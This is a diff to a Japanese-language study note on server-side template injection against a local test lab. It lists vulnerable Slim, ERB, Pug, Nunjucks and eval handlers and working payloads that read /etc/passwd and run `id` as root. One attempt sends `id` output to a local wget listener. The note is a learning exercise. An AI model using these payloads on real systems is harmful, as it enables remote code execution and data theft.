@@ -552,10 +552,189 @@ http://192.168.99.100:15005/reflect/eval?inj=`id`
 uid=0(root) gid=0(root) groups=0(root) 
 ```
 #### slim
+```ruby
+        when "slim"
 
+          template = Tilt['slim'].new() {|x| tpl}
+          res.write template.render
+```
+`http://192.168.99.100:15005/reflect/slim?inj=*`   
+![image](https://user-images.githubusercontent.com/56021519/102785606-97e4f800-43e1-11eb-8732-2edc23383104.png)   
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby---basic-injections   
+以下で空白が返る（応答なし）かエラーが返るかのどっちか。   
+応答なしの場合は実行できてるってことか？？   
+```txt
+http://192.168.99.100:15005/reflect/slim?inj=#{File.open('/etc/passwd').read}
+Slim::Parser::SyntaxError at /reflect/slim
+Expected attribute (__TEMPLATE__), Line 1, Column 2 #{File.open('/etc/passwd').read} ^ 
+
+http://192.168.99.100:15005/reflect/slim?inj=#{7*7}
+空白
+
+http://192.168.99.100:15005/reflect/slim?inj=#{system('cat%20/etc/passwd')}
+Slim::Parser::SyntaxError at /reflect/slim
+Expected attribute (__TEMPLATE__), Line 1, Column 2 #{system('cat%20/etc/passwd')} ^ 
+
+http://192.168.99.100:15005/reflect/slim?inj=#{ %x|env| }
+空白
+
+http://192.168.99.100:15005/reflect/slim?inj=%23{`wget%20http://127.0.0.1:9500`}
+Slim::Parser::SyntaxError at /reflect/slim
+Expected attribute (__TEMPLATE__), Line 1, Column 8 #{`wget http://127.0.0.1:9500`} ^ 
+
+http://192.168.99.100:15005/reflect/slim?inj=%23{`id`}
+空白
+
+http://192.168.99.100:15005/reflect/slim?inj=%23{Dir.entries(%27/%27)}
+Slim::Parser::SyntaxError at /reflect/slim
+Expected attribute (__TEMPLATE__), Line 1, Column 2 #{Dir.entries('/')} ^ 
+```
 #### erb
+```ruby
+        when "erb"
+          template = Tilt['erb'].new() {|x| tpl}
+          res.write template.render
+```
+以下でRCEとかできてる！URL encodeしないと`%`とかうまく機能しないのでそこはやる。   
+```txt
+http://192.168.99.100:15005/reflect/erb?inj=<%= 7 * 7 %>
+49
 
+http://192.168.99.100:15005/reflect/erb?inj=<%= File.open('/etc/passwd').read %>
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync 
+
+http://192.168.99.100:15005/reflect/erb?inj=<%= `id` %>
+uid=0(root) gid=0(root) groups=0(root) 
+```
 ### Node.js
+#### jade (pug)
+```js
+var connect = require('connect');
+var http = require('http');
+var url = require('url');
+var pug = require('pug');
+var nunjucks = require('nunjucks');
+var dust = require('dustjs-linkedin');
+var dusthelpers = require('dustjs-helpers');
+var randomstring = require("randomstring");
+var doT=require('dot');
+var marko=require('marko');
+var ejs=require('ejs');
+
+var app = connect();
+
+// Pug
+app.use('/pug', function(req, res){
+  if(req.url) {
+    var url_parts = url.parse(req.url, true);
+
+    var inj = url_parts.query.inj;
+    var tpl = '';
+    if('tpl' in url_parts.query && url_parts.query.tpl != '') {
+      // Keep the formatting a-la-python
+      tpl = url_parts.query.tpl.replace('%s', inj);
+    }
+    else {
+      tpl = inj;
+    }
+    res.end(randomstring.generate() + pug.render(tpl) + randomstring.generate());
+  }
+});
+```
+`http://192.168.99.100:15004/pug?inj=*`   
+![image](https://user-images.githubusercontent.com/56021519/102789503-974f6000-43e7-11eb-975f-4e6a907eaa26.png)   
+以下でRCE！   
+```txt
+http://192.168.99.100:15004/pug?inj=%23{root.process.exec(%27id%27)}
+TypeError: root.process.exec is not a function on line 1
+
+http://192.168.99.100:15004/pug?inj=%23{root.process.mainModule.require(%27child_process%27).spawnSync(%27cat%27,%20[%27/etc/passwd%27]).stdout}
+DWaaj1zol8AOye03vUgKQe45bjwYIJPp<root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+
+http://192.168.99.100:15004/pug?inj=%23{root.process.mainModule.require(%27child_process%27).spawnSync(%27id%27).stdout}
+f57THclTZCppfq15t6gWfVgGe7rgq4CJ<uid=0(root) gid=0(root) groups=0(root)
+></uid=0(root) gid=0(root) groups=0(root)
+>6O6QVxEh23H9q3McNQDhzd0hqOWBIVq9
+```
+#### nunjucks
+```js
+// Nunjucks
+app.use('/nunjucks', function(req, res){
+  if(req.url) {
+    var url_parts = url.parse(req.url, true);
+
+    var inj = url_parts.query.inj;
+    var tpl = '';
+    if('tpl' in url_parts.query) {
+      // Keep the formatting a-la-python
+      tpl = url_parts.query.tpl.replace('%s', inj);
+    }
+    else {
+      tpl = inj;
+    }
+    res.end(randomstring.generate() + nunjucks.renderString(tpl) + randomstring.generate());
+  }
+});
+```
+よくわからん。   
+```txt
+http://192.168.99.100:15004/nunjucks?inj=***
+TEDkpYm4gpNPPsw3mspMMDxnAMePvcSD***oPMmVEt3Hhwv7cz30d8cpdXdhrvdMD4o
+```
+#### javascript (eval)
+```js
+// Javascript
+app.use('/javascript', function(req, res){
+  if(req.url) {
+    var url_parts = url.parse(req.url, true);
+
+    var inj = url_parts.query.inj;
+    var tpl = '';
+    if('tpl' in url_parts.query) {
+      // Keep the formatting a-la-python
+      tpl = url_parts.query.tpl.replace('%s', inj);
+    }
+    else {
+      tpl = inj;
+    }
+    res.end(randomstring.generate() + String(eval(tpl)) + randomstring.generate());
+  }
+});
+```
+https://medium.com/@sebnemK/node-js-rce-and-a-simple-reverse-shell-ctf-1b2de51c1a44   
+以下でファイル読んだりできる。   
+```txt
+http://192.168.99.100:15004/javascript?inj=require(%27fs%27).readdirSync(%27.%27).toString()
+yPCpFdo60IRcRMGyG4evWdBRNWscMz09IkeFEEpcBIQEAREtFRPh9scGWd9pZjIV.js,connect-app.js,node_modules,package-lock.jsonp4KOTBIQhUrikadU5qAuPCq9f28WCiiI
+
+http://192.168.99.100:15004/javascript?inj=require(%27fs%27).readdirSync(%27..%27).toString()
+IXjrDkxpfDjDXkFGHJuZXuCR7mqMexcJbasetest.py,env_java_tests,env_node_tests,env_php_tests,env_py_tests,env_ruby_tests,run_channel_test.sh,run_java_tests.sh,run_node_tests.sh,run_php_tests.sh,run_python2_tests.sh,run_python3_tests.sh,run_ruby_tests.sh,test_channel.py,test_java_freemarker.py,test_java_velocity.py,test_node_dot.py,test_node_dust.py,test_node_ejs.py,test_node_javascript.py,test_node_marko.py,test_node_nunjucks.py,test_node_pug.py,test_php_php.py,test_php_smarty_secured.py,test_php_smarty_unsecured.py,test_php_twig_secured.py,test_php_twig_unsecured.py,test_py_jinja2.py,test_py_mako.py,test_py_python.py,test_py_tornado.py,test_ruby_erb.py,test_ruby_ruby.py,test_ruby_slim.py,tests.shR9nOTptanlyTaBR5wlBbENbc9mL6tRqP
+
+http://192.168.99.100:15004/javascript?inj=require(%22fs%22).readFileSync(%22/etc/passwd%22).toString(%27utf8%27)
+GNTXzKNvUVwjiltuHC2s9cfzcJUhKWOEroot:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+```
+以下でRCEできるはずだけどなんかできてない…。   
+```txt
+http://192.168.99.100:15004/javascript?inj=require(%22child_process%22).exec(%27id%27)
+7c7WZtoA2NYGyIAqsIIpOkYAxk59tdvD[object Object]sTfcMuWmXVA1Sq0RRbh9SQ8R3VpETd8C
+
+require('child_process').exec('wget http://localhost:9500/id=`id`');
+
+WSL上で
+>eval("require('child_process').exec('wget http://localhost:9500/id=`id`');")
+をやると行けるのに…。
+127.0.0.1 - - [22/Dec/2020 00:20:24] "GET /id=uid=1000(tomoki) HTTP/1.1" 404 -
+```
+#### dot
+#### dust
+#### marko
+#### ejs
 
 # メモ
 escapeHTMLってどんな感じでエスケープする？   
